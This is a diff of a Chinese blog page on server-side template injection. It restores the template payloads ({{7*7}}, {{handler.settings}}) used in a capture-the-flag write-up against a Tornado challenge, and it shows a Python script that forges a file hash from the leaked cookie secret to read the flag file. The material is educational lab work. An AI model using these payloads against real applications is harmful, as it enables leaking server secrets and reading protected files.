@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/image0dc2f4688312e8b2.png">
 <meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/image6a3b671675b9706a.png">
 <meta property="article:published_time" content="2020-03-24T04:00:02.000Z">
-<meta property="article:modified_time" content="2020-03-24T14:54:31.868Z">
+<meta property="article:modified_time" content="2020-03-24T15:09:31.877Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
@@ -503,7 +503,7 @@ height:50vh;
 </ul>
 <h2 id="2-识别阶段"><a href="#2-识别阶段" class="headerlink" title="2.识别阶段"></a>2.识别阶段</h2><p>检测到模板注入漏洞后，就要开始识别产生漏洞的模板引擎，当有报错信息时，我们有时候可能可以通过报错来确认其所使用的模板引擎，但当异常被捕捉时这种方法就没用了，以下是Burpsuite对不同模板接受的Payload的分类：</p>
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wpc77a4f2da100a5bb.jpg" alt="us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wpc77a4f2da100a5bb.jpg"></p>
-<p>绿线表示成功返回，红线失败，同一个Payload在不同的模板引擎中可能返回不同的结果，例如 <code>49</code>在Twig中返回<code>49</code>，而在Jinja2中返回 <code>7777777</code></p>
+<p>绿线表示成功返回，红线失败，同一个Payload在不同的模板引擎中可能返回不同的结果，例如 <code>{{7*'7'}}</code>在Twig中返回<code>49</code>，而在Jinja2中返回 <code>7777777</code></p>
 <h2 id="3-利用阶段"><a href="#3-利用阶段" class="headerlink" title="3.利用阶段"></a>3.利用阶段</h2><p>当我们成功识别产生漏洞的模板引擎后就进入了漏洞利用阶段，在这个阶段，第一步要做的就是找到并阅读该模板引擎的文档，主要可以关注以下几个方面：</p>
 <ul>
 <li>该模板的基本语法</li>
@@ -525,11 +525,11 @@ height:50vh;
 <p><code>http://5478cafd-258b-4288-a0fb-1e40389e5e13.node3.buuoj.cn/error?msg=Error</code></p>
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/imagef993ad3f164fd876.png" alt="imagef993ad3f164fd876.png"></p>
 <p>当然到这里我们肯定已经知道这里存在模板注入，而如果单纯做题的话，我们也可以从<code>welcome.txt</code>里面提示的<code>render</code>以及题目<strong>tornado</strong>的提示知道这里可能存在模板注入</p>
-<p>那么我们可以先测试一下，传入<code>1</code>：</p>
-<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=1</code></p>
+<p>那么我们可以先测试一下，传入<code>{{1}}</code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg={{1}}</code></p>
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/imagec8e68e66c1edfb44.png" alt="imagec8e68e66c1edfb44.png"></p>
-<p>再传入<code>49</code>：</p>
-<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=49</code></p>
+<p>再传入<code>{{7*7}}</code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg={{7*7}}</code></p>
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/imagee503d4f2aa2c54dc.png" alt="imagee503d4f2aa2c54dc.png"></p>
 <p>发现不存在运算</p>
 <p>根据<code>hints.txt</code>的提示，要拿到flag需要拿到cookie，那么肯定是利用这里的漏洞来获取了</p>
@@ -537,8 +537,8 @@ height:50vh;
 <blockquote>
 <p>在Tornado中，RequestHandler是HTTP请求处理程序的基类</p>
 </blockquote>
-<p>这时传入<code></code>：</p>
-<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=</code></p>
+<p>这时传入<code>{{handler.settings}}</code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg={{handler.settings}}</code></p>
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/image0dc2f4688312e8b2.png" alt="image0dc2f4688312e8b2.png"></p>
 <p>拿到cookie，然后根据<code>hints.txt</code>的提示，写出payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/file?'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(ss)</span>:</span></span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(ss.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line">    filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie = <span class="string">'3b649d27-41e2-470a-ab84-d5c3ff7520cc'</span></span><br><span class="line">    res = md5(cookie+md5(filename))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    response = s.get(url+ <span class="string">'filename='</span> + filename + <span class="string">'&amp;filehash='</span> + filehash())</span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure>
@@ -547,6 +547,8 @@ height:50vh;
 <p><img src="http://picture.2er0blog.com/images/2020/03/24/image6a3b671675b9706a.png" alt="image6a3b671675b9706a.png"></p>
 <h1 id="附：检测模板注入的工具"><a href="#附：检测模板注入的工具" class="headerlink" title="附：检测模板注入的工具"></a>附：检测模板注入的工具</h1><p>GitHub上已经有大佬写出了自动检测SSTI漏洞的工具，本篇文章不再介绍工具的使用，这里我放上地址就好</p>
 <p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">戳我</a></p>
+
+
 <blockquote>
 <p>参考资料：</p>
 <ul>
